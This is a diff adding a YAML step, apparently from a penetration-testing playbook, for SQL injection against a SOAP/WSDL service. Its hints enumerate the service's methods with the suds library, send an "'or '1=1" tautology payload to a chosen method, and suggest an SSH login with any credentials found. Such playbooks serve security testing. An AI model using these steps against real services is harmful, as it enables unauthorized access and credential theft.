@@ -1,0 +1,18 @@
+description: sql injection in wsdl
+function: magic_function
+argument: []
+In: []
+condition: 
+  - and:
+    - ssh in Service
+    - or:
+      - soap in Service
+      - SOAP in Service
+Out: []
+hint:
+  - "[EXE]pip install suds"
+  - "[INPUT]soap_service_port"
+  - "[EXE]python -c \"from suds.client import Client;client=Client('http://{Data['IP']}:{Data['soap_service_port']}/?wsdl');print(client)\""
+  - "Open another termial, enter command below, and substitute <Method> to any one in above 'Methods'
+  \npython -c \"from suds.client import Client;client=Client('http://{Data['IP']}:{Data['soap_service_port']}/?wsdl');print(client.service.<Method>(\\\\\"'or '1=1\\\\\"))\""
+  - "You may find some authentication, can you use then to login (ssh <user>@{Data['IP']})? (y/N)"
